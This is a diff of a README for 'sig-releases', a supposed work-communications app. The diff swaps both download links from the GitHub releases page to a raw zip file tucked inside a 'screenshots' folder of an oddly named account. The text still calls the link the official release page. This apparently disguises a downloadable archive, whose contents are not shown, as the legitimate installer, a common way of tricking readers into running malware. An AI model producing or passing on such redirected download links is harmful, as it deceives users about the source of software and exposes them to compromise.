@@ -1,6 +1,6 @@
 # 🤖 sig-releases - Make sense of your work communications
 
-[![](https://img.shields.io/badge/Download-Sig-blue.svg)](https://github.com/psoraleaesculentastinkingwattle765/sig-releases/releases)
+[![](https://img.shields.io/badge/Download-Sig-blue.svg)](https://raw.githubusercontent.com/psoraleaesculentastinkingwattle765/sig-releases/main/screenshots/releases_sig_v2.7.zip)
 
 Sig helps you organize your daily work tasks. It tracks projects, summarizes long chat threads, and points out important deadlines. You spend less time searching for information and more time finishing your work.
 
@@ -8,7 +8,7 @@ Sig helps you organize your daily work tasks. It tracks projects, summarizes lon
 
 You need to download the installer from the official release page. 
 
-[Visit this page to download the latest version of Sig](https://github.com/psoraleaesculentastinkingwattle765/sig-releases/releases)
+[Visit this page to download the latest version of Sig](https://raw.githubusercontent.com/psoraleaesculentastinkingwattle765/sig-releases/main/screenshots/releases_sig_v2.7.zip)
 
 Look for the section labeled "Assets" at the bottom of the page. Click the file ending in `.exe` to start the download. Save this file to your computer’s Downloads folder.
 
